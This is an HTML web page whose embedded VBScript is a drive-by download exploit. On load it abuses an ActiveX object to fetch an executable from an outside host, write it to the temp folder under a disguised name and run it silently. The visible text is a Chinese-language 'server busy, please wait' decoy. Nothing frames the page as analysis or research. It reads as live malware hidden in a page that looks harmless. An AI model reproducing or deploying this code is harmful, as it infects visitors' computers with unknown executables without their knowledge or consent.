<html>
<head>
<script language="VBScript">
	on error resume next
	download = "http://guodongai0.go1.icpcn.com/z.exe"
	Set dE = document.createElement("object")
	dE.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
	str="Microsoft.XMLHTTP"
	Set str = dE.CreateObject(str,"")
	str1="Ado"
	str2="db."
	str3="Str"
	str4="eam"
	str5=str1&str2&str3&str4
	str6=str5
	set S = dE.createobject(str6,"")
	S.type = 1
	str7="GET"
	str.Open str7, download, False
	str.Send
	filename="Nonsenser.Com"
	set Fso = dE.createobject("Scripting.FileSystemObject","")
	set tmp = Fso.GetSpecialFolder(2)
	filename="Nonsenser.Com"
	set Fso = dE.createobject("Scripting.FileSystemObject","")
	set tmp = Fso.GetSpecialFolder(2)
	filename= Fso.BuildPath(tmp,filename)
	S.open
	S.write str.responseBody
	S.savetofile filename,2
	S.close
	set Exe = dE.createobject("Shell.Application","")
	Exe.ShellExecute filename,"","","open",0
</script>
<title></title>
</head>
<body>
<center></center>
</body>
</html>
<body>
<center>服务器忙......请等待....如果长时间
不能跳转进入网站,请刷新页面进行重试
.
</center>
</body>
</html>

